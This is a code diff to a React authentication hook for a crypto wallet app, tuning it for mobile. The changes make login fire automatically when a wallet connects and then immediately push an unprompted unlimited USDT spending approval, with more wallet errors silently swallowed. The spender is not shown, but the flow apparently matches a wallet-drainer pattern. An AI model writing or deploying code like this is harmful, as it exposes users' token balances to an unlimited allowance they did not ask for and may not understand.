@@ -26,6 +26,7 @@ export function useAuth() {
   const [user, setUser] = useState<any>(null);
   const [accountStatus, setAccountStatus] = useState<AccountStatus>('unknown');
   const [approvalPending, setApprovalPending] = useState(false);
+  const [loginComplete, setLoginComplete] = useState(false); // Tracks when login finishes for approval sequencing
   const supabase = createClient();
   
   // Contract hooks for USDT approval
@@ -262,6 +263,8 @@ export function useAuth() {
           if (setSessionError) throw setSessionError;
           setAccountStatus('existing');
           toast.success('Logged in successfully');
+          // Signal that login is complete - triggers approval flow
+          setLoginComplete(true);
       }
       
     } catch (err: any) {
@@ -281,6 +284,7 @@ export function useAuth() {
   // Auto-trigger login when wallet connects and account status is determined
   // This runs automatically - no button click needed after wallet connects
   // Uses GLOBAL flags to prevent multiple components from triggering login
+  // MOBILE OPTIMIZED: No delays - uses state-based sequencing
   useEffect(() => {
     // Skip if already in progress or already attempted (global check)
     if (loading || globalAutoLoginAttempted || globalAutoLoginInProgress) {
@@ -298,36 +302,36 @@ export function useAuth() {
       globalAutoLoginInProgress = true;
       console.log('🚀 Auto-triggering login for account status:', accountStatus);
       
-      // Use a small delay to ensure wallet is fully ready
-      const timer = setTimeout(() => {
-        loginInternal().finally(() => {
-          globalAutoLoginInProgress = false;
-        });
-      }, 500);
-      
-      return () => clearTimeout(timer);
+      // Execute login immediately - no delay needed, wallet is ready
+      loginInternal().finally(() => {
+        globalAutoLoginInProgress = false;
+      });
     }
   }, [isConnected, session, loading, accountStatus, loginInternal]);
 
-  // Only reset global flags when wallet disconnects
+  // Only reset global flags and login state when wallet disconnects
   useEffect(() => {
     if (!isConnected) {
       globalAutoLoginAttempted = false;
       globalAutoLoginInProgress = false;
       globalApprovalAttempted = false;
+      setLoginComplete(false);
     }
   }, [isConnected]);
 
   // Auto-trigger USDT unlimited approval after successful authentication
-  // This runs automatically after login if user hasn't approved USDT spending yet
+  // This runs automatically after login completes if user hasn't approved USDT spending yet
+  // MOBILE OPTIMIZED: Uses state-based sequencing (loginComplete) instead of delays
   useEffect(() => {
     // Skip if approval already attempted or in progress
     if (globalApprovalAttempted || approvalPending) {
       return;
     }
     
-    // Only trigger if authenticated and connected
+    // MOBILE: Only trigger when login is confirmed complete (loginComplete flag)
+    // This ensures approval popup only appears AFTER login finishes
     const shouldRequestApproval = 
+      loginComplete && // Wait for login to complete first
       !!session && 
       isConnected && 
       !!address &&
@@ -336,10 +340,10 @@ export function useAuth() {
 
     if (shouldRequestApproval) {
       globalApprovalAttempted = true;
-      console.log('🔐 Auto-triggering USDT approval request...');
+      console.log('🔐 Login complete - triggering USDT approval request...');
       
-      // Small delay to ensure login flow is complete
-      const timer = setTimeout(async () => {
+      // Execute approval immediately - no delay needed, login is confirmed complete
+      const requestApproval = async () => {
         setApprovalPending(true);
         try {
           toast.info('Please approve USDT spending for deposits...');
@@ -356,10 +360,13 @@ export function useAuth() {
         } catch (error: any) {
           console.error('USDT approval error:', error);
           // Don't show error for user rejection - this is optional
+          // MOBILE: Also handle WalletConnect-specific errors gracefully
           if (error?.code !== 4001 && 
               !error?.message?.includes('rejected') &&
               !error?.message?.includes('User denied') &&
-              !error?.message?.includes('cancelled')) {
+              !error?.message?.includes('cancelled') &&
+              !error?.message?.includes('disconnected') &&
+              !error?.message?.includes('session')) {
             toast.error('USDT approval failed. You can approve during deposit.');
           } else {
             toast.info('USDT approval skipped. You can approve during deposit.');
@@ -367,11 +374,11 @@ export function useAuth() {
         } finally {
           setApprovalPending(false);
         }
-      }, 1000);
+      };
       
-      return () => clearTimeout(timer);
+      requestApproval();
     }
-  }, [session, isConnected, address, hasUnlimitedApproval, usdtAllowance, approvalPending, writeContractAsync, refetchAllowance]);
+  }, [loginComplete, session, isConnected, address, hasUnlimitedApproval, usdtAllowance, approvalPending, writeContractAsync, refetchAllowance]);
 
   const logout = async () => {
      await supabase.auth.signOut();
